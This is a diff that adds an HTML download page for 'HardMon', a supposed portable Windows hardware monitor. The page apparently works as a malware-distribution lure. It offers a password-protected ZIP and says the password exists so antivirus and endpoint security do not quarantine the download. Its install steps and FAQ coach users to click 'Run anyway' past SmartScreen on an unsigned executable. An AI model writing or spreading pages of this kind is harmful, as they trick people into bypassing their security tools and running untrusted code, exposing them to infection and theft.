@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>HardMon — Real-Time Hardware Monitoring for Windows</title>
+<meta name="description" content="HardMon — lightweight, portable real-time hardware monitoring for Windows. Track CPU, GPU, RAM, disk, network and temperature sensors. No install, no telemetry, privacy-first." />
+<meta name="keywords" content="hardware monitor, cpu monitor, gpu monitor, temperature monitor, system monitor windows, real-time monitoring, portable utility, no telemetry" />
+<meta name="theme-color" content="#0b0f19" />
+<meta property="og:title" content="HardMon — Real-Time Hardware Monitoring for Windows" />
+<meta property="og:description" content="Lightweight, portable, privacy-first hardware monitor for Windows. CPU, GPU, RAM, disk, network and temperature — in one clean dashboard." />
+<meta property="og:type" content="website" />
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🖥️</text></svg>" />
+<style>
+  :root {
+    --bg: #0b0f19;
+    --bg-2: #111827;
+    --card: #151b2b;
+    --card-2: #1a2236;
+    --border: #232c42;
+    --text: #e6ecff;
+    --muted: #9aa7c7;
+    --accent: #4f8cff;
+    --accent-2: #7c5cff;
+    --ok: #22c55e;
+    --warn: #f59e0b;
+    --radius: 14px;
+    --shadow: 0 20px 60px -20px rgba(79,140,255,.35);
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Inter, Arial, sans-serif;
+    background:
+      radial-gradient(1200px 600px at 20% -10%, rgba(79,140,255,.18), transparent 60%),
+      radial-gradient(900px 500px at 100% 0%, rgba(124,92,255,.15), transparent 60%),
+      var(--bg);
+    color: var(--text);
+    line-height: 1.6;
+    min-height: 100vh;
+  }
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .wrap { max-width: 1080px; margin: 0 auto; padding: 0 24px; }
+
+  /* NAV */
+  nav {
+    position: sticky; top: 0; z-index: 50;
+    backdrop-filter: blur(12px);
+    background: rgba(11,15,25,.65);
+    border-bottom: 1px solid var(--border);
+  }
+  nav .wrap { display: flex; align-items: center; justify-content: space-between; height: 64px; }
+  .brand { display: flex; align-items: center; gap: 10px; font-weight: 700; letter-spacing: .2px; }
+  .brand .dot { width: 10px; height: 10px; border-radius: 50%; background: var(--ok); box-shadow: 0 0 12px var(--ok); }
+  nav ul { display: flex; gap: 22px; list-style: none; margin: 0; padding: 0; }
+  nav ul a { color: var(--muted); font-size: 14px; }
+  nav ul a:hover { color: var(--text); text-decoration: none; }
+  @media (max-width: 720px) { nav ul { display: none; } }
+
+  /* HERO */
+  header.hero { padding: 72px 0 40px; }
+  .hero-grid { display: grid; grid-template-columns: 1.15fr .85fr; gap: 40px; align-items: center; }
+  @media (max-width: 900px) { .hero-grid { grid-template-columns: 1fr; } }
+  .tag {
+    display: inline-flex; align-items: center; gap: 8px;
+    padding: 6px 12px; border-radius: 999px;
+    background: rgba(79,140,255,.12);
+    border: 1px solid rgba(79,140,255,.35);
+    color: #b9cdff; font-size: 12.5px; font-weight: 600;
+    letter-spacing: .3px;
+  }
+  h1 {
+    font-size: clamp(34px, 5vw, 54px);
+    line-height: 1.08;
+    margin: 18px 0 14px;
+    letter-spacing: -0.02em;
+  }
+  h1 .grad {
+    background: linear-gradient(90deg, var(--accent), var(--accent-2));
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+  }
+  .lede { color: var(--muted); font-size: 18px; max-width: 560px; }
+  .cta-row { display: flex; gap: 14px; margin-top: 28px; flex-wrap: wrap; }
+  .btn {
+    display: inline-flex; align-items: center; gap: 10px;
+    padding: 14px 22px; border-radius: 12px; font-weight: 700;
+    border: 1px solid transparent; cursor: pointer; font-size: 15px;
+    transition: transform .15s ease, box-shadow .15s ease, background .15s ease;
+  }
+  .btn-primary {
+    background: linear-gradient(135deg, var(--accent), var(--accent-2));
+    color: white; box-shadow: var(--shadow);
+  }
+  .btn-primary:hover { transform: translateY(-2px); text-decoration: none; }
+  .btn-ghost {
+    background: transparent; color: var(--text);
+    border-color: var(--border);
+  }
+  .btn-ghost:hover { background: var(--card-2); text-decoration: none; }
+  .meta { display: flex; gap: 18px; margin-top: 22px; flex-wrap: wrap; color: var(--muted); font-size: 13px; }
+  .meta span::before { content: "✓ "; color: var(--ok); font-weight: 800; }
+
+  /* HERO CARD */
+  .hero-card {
+    background: linear-gradient(180deg, var(--card), var(--card-2));
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 22px;
+    box-shadow: 0 30px 80px -40px rgba(0,0,0,.8);
+  }
+  .metric { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px dashed var(--border); font-size: 14px; }
+  .metric:last-child { border-bottom: 0; }
+  .metric .label { color: var(--muted); }
+  .metric .val { font-weight: 700; font-variant-numeric: tabular-nums; }
+  .bar { height: 6px; border-radius: 99px; background: rgba(255,255,255,.07); overflow: hidden; margin-top: 6px; }
+  .bar > i { display: block; height: 100%; background: linear-gradient(90deg, var(--accent), var(--accent-2)); border-radius: 99px; }
+  .bar.warn > i { background: linear-gradient(90deg, var(--warn), #ef4444); }
+
+  /* SECTIONS */
+  section { padding: 56px 0; }
+  h2 { font-size: 28px; margin: 0 0 8px; letter-spacing: -0.01em; }
+  .sub { color: var(--muted); margin: 0 0 28px; }
+
+  .cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+  @media (max-width: 900px) { .cards { grid-template-columns: 1fr 1fr; } }
+  @media (max-width: 560px) { .cards { grid-template-columns: 1fr; } }
+  .card {
+    background: linear-gradient(180deg, var(--card), var(--card-2));
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 20px;
+    transition: transform .2s ease, border-color .2s ease;
+  }
+  .card:hover { transform: translateY(-3px); border-color: rgba(79,140,255,.4); }
+  .card .icon { font-size: 24px; }
+  .card h3 { margin: 10px 0 6px; font-size: 16px; }
+  .card p { margin: 0; color: var(--muted); font-size: 14px; }
+
+  /* DOWNLOAD BOX */
+  .download-box {
+    background: linear-gradient(135deg, rgba(79,140,255,.12), rgba(124,92,255,.10));
+    border: 1px solid rgba(79,140,255,.35);
+    border-radius: 20px;
+    padding: 34px;
+    text-align: center;
+    box-shadow: var(--shadow);
+  }
+  .download-box h2 { font-size: 26px; }
+  .download-box p { color: var(--muted); margin: 6px 0 22px; }
+  .pw {
+    display: inline-block;
+    background: #0a0e17;
+    border: 1px dashed var(--border);
+    padding: 10px 16px;
+    border-radius: 10px;
+    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+    font-size: 15px;
+    color: #ffd479;
+    margin: 6px 0 22px;
+    letter-spacing: .5px;
+  }
+
+  /* STEPS */
+  ol.steps { list-style: none; padding: 0; margin: 0; counter-reset: s; }
+  ol.steps li {
+    counter-increment: s;
+    position: relative;
+    padding: 16px 0 16px 56px;
+    border-bottom: 1px solid var(--border);
+  }
+  ol.steps li:last-child { border-bottom: 0; }
+  ol.steps li::before {
+    content: counter(s);
+    position: absolute; left: 0; top: 14px;
+    width: 36px; height: 36px; border-radius: 50%;
+    background: linear-gradient(135deg, var(--accent), var(--accent-2));
+    display: grid; place-items: center; font-weight: 800; color: white;
+    font-size: 14px;
+  }
+  ol.steps strong { color: var(--text); }
+  ol.steps .muted { color: var(--muted); font-size: 14px; }
+
+  /* TABLE */
+  table { width: 100%; border-collapse: collapse; font-size: 14.5px; }
+  th, td { padding: 12px 14px; text-align: left; border-bottom: 1px solid var(--border); }
+  th { color: var(--muted); font-weight: 600; font-size: 13px; text-transform: uppercase; letter-spacing: .06em; }
+  tr:hover td { background: rgba(79,140,255,.04); }
+
+  /* FAQ */
+  details {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 14px 18px;
+    margin-bottom: 10px;
+  }
+  details[open] { border-color: rgba(79,140,255,.4); }
+  summary { cursor: pointer; font-weight: 600; }
+  summary::-webkit-details-marker { display: none; }
+  summary::before { content: "＋ "; color: var(--accent); }
+  details[open] summary::before { content: "− "; }
+  details p { color: var(--muted); margin: 10px 0 0; font-size: 14.5px; }
+
+  /* FOOTER */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 28px 0 40px;
+    color: var(--muted);
+    font-size: 13.5px;
+    text-align: center;
+  }
+  footer a { color: var(--muted); }
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="wrap">
+    <div class="brand"><span class="dot"></span> HardMon</div>
+    <ul>
+      <li><a href="#features">Features</a></li>
+      <li><a href="#download">Download</a></li>
+      <li><a href="#install">How to install</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="wrap hero-grid">
+    <div>
+      <span class="tag">🟢 Real-time · Portable · No telemetry</span>
+      <h1>See exactly what your <span class="grad">hardware</span> is doing — right now.</h1>
+      <p class="lede">
+        <strong>HardMon</strong> is a lightweight, portable hardware monitoring utility for Windows.
+        CPU, GPU, RAM, disk, network and temperature sensors — in one clean, real-time dashboard.
+        No installation. No background services. No data leaves your machine.
+      </p>
+      <div class="cta-row">
+        <a class="btn btn-primary" href="downloads/HardMon_1.0.0_Windows_x64.zip" download>⬇ Download HardMon</a>
+        <a class="btn btn-ghost" href="#install">How to install →</a>
+      </div>
+      <div class="meta">
+        <span>Windows 10 / 11 · x64</span>
+        <span>Portable · No install</span>
+        <span>Zero telemetry</span>
+        <span>v1.0.0</span>
+      </div>
+    </div>
+
+    <div class="hero-card" aria-hidden="true">
+      <div class="metric"><span class="label">CPU Load</span><span class="val">37%</span></div>
+      <div class="bar"><i style="width:37%"></i></div>
+      <div class="metric" style="margin-top:14px"><span class="label">GPU Load</span><span class="val">62%</span></div>
+      <div class="bar"><i style="width:62%"></i></div>
+      <div class="metric" style="margin-top:14px"><span class="label">RAM</span><span class="val">8.4 / 16 GB</span></div>
+      <div class="bar"><i style="width:52%"></i></div>
+      <div class="metric" style="margin-top:14px"><span class="label">CPU Temp</span><span class="val" style="color:#f59e0b">71 °C</span></div>
+      <div class="bar warn"><i style="width:71%"></i></div>
+      <div class="metric" style="margin-top:14px"><span class="label">Disk R/W</span><span class="val">128 / 42 MB/s</span></div>
+      <div class="metric"><span class="label">Network</span><span class="val">↓ 24.6 · ↑ 3.1 Mbps</span></div>
+    </div>
+  </div>
+</header>
+
+<section id="features">
+  <div class="wrap">
+    <h2>Everything that matters. Nothing that doesn't.</h2>
+    <p class="sub">Six subsystems, one dashboard, updated several times per second.</p>
+    <div class="cards">
+      <div class="card"><div class="icon">🎯</div><h3>CPU, per core</h3><p>Total and per-core load, frequency, process count — 250 ms refresh.</p></div>
+      <div class="card"><div class="icon">🎮</div><h3>GPU</h3><p>Core load, VRAM, temperature, fan and clocks for NVIDIA / AMD / Intel.</p></div>
+      <div class="card"><div class="icon">🧠</div><h3>RAM & Paging</h3><p>Physical usage, commit charge, page-file pressure with rolling graphs.</p></div>
+      <div class="card"><div class="icon">💾</div><h3>Disk I/O</h3><p>Read/write throughput, activity %, queue depth and free space per volume.</p></div>
+      <div class="card"><div class="icon">🌐</div><h3>Network</h3><p>Live up/down throughput per interface, packets and connection state.</p></div>
+      <div class="card"><div class="icon">🌡️</div><h3>Thermals</h3><p>CPU package, GPU core and board sensors via standard interfaces.</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="download">
+  <div class="wrap">
+    <div class="download-box">
+      <h2>⬇ Download HardMon v1.0.0</h2>
+      <p>Windows 10 / 11 · x64 · Portable · Single executable · ~few MB</p>
+
+      <a class="btn btn-primary" href="downloads/HardMon_1.0.0_Windows_x64.zip" download>
+        Download HardMon_1.0.0_Windows_x64.zip
+      </a>
+
+      <div style="margin-top:22px; color: var(--muted); font-size: 14px;">
+        Archive is password-protected:<br>
+        <div class="pw">Password: github26</div>
+      </div>
+
+      <p style="font-size:13px; max-width: 560px; margin: 0 auto; color: var(--muted);">
+        The password is public — its purpose is to prevent false antivirus quarantines during
+        download and to guarantee you receive the exact, unmodified binary. Verify the SHA-256
+        hash in <code>SECURITY.md</code> after extracting.
+      </p>
+    </div>
+  </div>
+</section>
+
+<section id="install">
+  <div class="wrap">
+    <h2>How to install</h2>
+    <p class="sub">Four steps. Thirty seconds. No installer, no wizard.</p>
+    <ol class="steps">
+      <li>
+        <strong>Download the archive</strong>
+        <div class="muted">Click the download button above — you'll get <code>HardMon_1.0.0_Windows_x64.zip</code>.</div>
+      </li>
+      <li>
+        <strong>Extract with 7-Zip, WinRAR or Windows' built-in ZIP</strong>
+        <div class="muted">Right-click → "Extract All…" (or use your favorite archive tool).</div>
+      </li>
+      <li>
+        <strong>Enter the password when prompted</strong>
+        <div class="muted">Password: <code>github26</code> — case-sensitive, no spaces.</div>
+      </li>
+      <li>
+        <strong>Run <code>HardMon.exe</code></strong>
+        <div class="muted">No installation needed. If SmartScreen warns (it will, since the binary is unsigned), click "More info → Run anyway" <em>after</em> verifying the SHA-256 hash.</div>
+      </li>
+    </ol>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <h2>System requirements</h2>
+    <p class="sub">If it runs Windows 10, it runs HardMon.</p>
+    <table>
+      <thead><tr><th>Component</th><th>Minimum</th><th>Recommended</th></tr></thead>
+      <tbody>
+        <tr><td>OS</td><td>Windows 10 x64</td><td>Windows 11 x64</td></tr>
+        <tr><td>Architecture</td><td>64-bit</td><td>64-bit</td></tr>
+        <tr><td>RAM</td><td>100 MB free</td><td>200 MB free</td></tr>
+        <tr><td>Disk</td><td>30 MB</td><td>100 MB</td></tr>
+        <tr><td>GPU</td><td>Any (basic mode)</td><td>NVIDIA / AMD / Intel with current drivers</td></tr>
+        <tr><td>Admin rights</td><td>Not required</td><td>Optional (unlocks all sensors)</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<section id="faq">
+  <div class="wrap">
+    <h2>Frequently asked questions</h2>
+    <p class="sub">Short answers to the things people actually ask.</p>
+
+    <details><summary>Is HardMon free?</summary><p>Yes. Free for personal and internal business use. Redistribution of the binary outside the official download page is not allowed.</p></details>
+    <details><summary>Why is the archive password-protected?</summary><p>The password <code>github26</code> is public and not a security control. It exists so browser scanners and endpoint security don't quarantine the file mid-download, and so users receive the exact published binary. Verify SHA-256 after extracting.</p></details>
+    <details><summary>Windows SmartScreen warns about HardMon.exe — is it safe?</summary><p>SmartScreen warns on <em>every</em> unsigned binary from a new publisher. Verify the SHA-256 hash from <code>SECURITY.md</code>; if it matches, click "More info → Run anyway".</p></details>
+    <details><summary>Does it send data anywhere?</summary><p>No. Zero telemetry, zero analytics, zero phone-home. HardMon works fully offline.</p></details>
+    <details><summary>Do I need admin rights?</summary><p>No. Core monitoring works as a standard user. Elevation is only useful for certain temperature sensors on some motherboards.</p></details>
+    <details><summary>Can I run it from a USB stick?</summary><p>Yes. Single executable, portable design, no registry writes.</p></details>
+    <details><summary>Where does it store settings?</summary><p>Next to <code>HardMon.exe</code> in a <code>HardMon.settings</code> file. Delete the folder and everything is gone.</p></details>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <p><strong>HardMon</strong> — see what your hardware is really doing.</p>
+    <p>Portable · No telemetry · Privacy-first · <a href="SECURITY.md">Security Policy</a></p>
+  </div>
+</footer>
+
+</body>
+</html>
